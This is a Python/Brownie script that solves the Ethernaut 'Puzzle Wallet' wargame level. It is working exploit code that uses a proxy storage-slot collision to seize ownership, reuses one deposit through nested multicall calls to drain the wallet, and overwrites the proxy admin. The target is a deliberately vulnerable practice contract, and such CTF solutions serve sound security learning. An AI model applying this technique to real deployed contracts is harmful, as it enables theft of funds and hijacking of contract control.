from brownie import web3, PuzzleProxy, PuzzleWallet

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "24_puzzle_wallet"
INTERFACE_CONTRACT = PuzzleProxy
INSTANCE_VALUE_WEI = web3.toWei(1, "ether")

# blog post with explanation on how to solve the level
# https://medium.com/@appsbylamby/ethernaut-24-puzzle-wallet-walkthrough-mastering-the-proxy-pattern-cc830dc364ce
def solve_level(level_contract):
    account = get_account()
    for x in range(3):
        storage_slot = web3.eth.get_storage_at(level_contract.address, x)
        print(f"Slot {x}: " + web3.toHex(storage_slot))
    puzzle_wallet = PuzzleWallet.at(level_contract)

    print("Owner old: " + str(puzzle_wallet.owner()))
    # We will become owner of puzzle_wallet
    level_contract.proposeNewAdmin(account, {"from": account})
    print("Owner new: " + str(puzzle_wallet.owner()))

    # We can add our address to white list because we are the owner
    puzzle_wallet.addToWhitelist(account, {"from": account})

    # We can't yet use setMaxBalance to become admin of PuzzleProxy because puzzle wallet is not empty
    print("Puzzle wallet balance: " + str(puzzle_wallet.balance()))

    calldata_deposit = puzzle_wallet.deposit.encode_input()
    calldata_MC_deposit = puzzle_wallet.multicall.encode_input([calldata_deposit])
    calldata_execute = puzzle_wallet.execute.encode_input(
        account.address, web3.toWei(2, "ether"), ""
    )
    # Stackoverflow: Add Variables to Tuple
    # https://stackoverflow.com/questions/1380860/add-variables-to-tuple
    calldata = (calldata_deposit, calldata_MC_deposit, calldata_execute)
    puzzle_wallet.multicall(
        calldata, {"from": account, "value": web3.toWei(1, "ether")}
    )
    print("Puzzle wallet balance: " + str(puzzle_wallet.balance()))

    puzzle_wallet.setMaxBalance(account.address, {"from": account})


# brownie run scripts/_24_puzzle_wallet.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
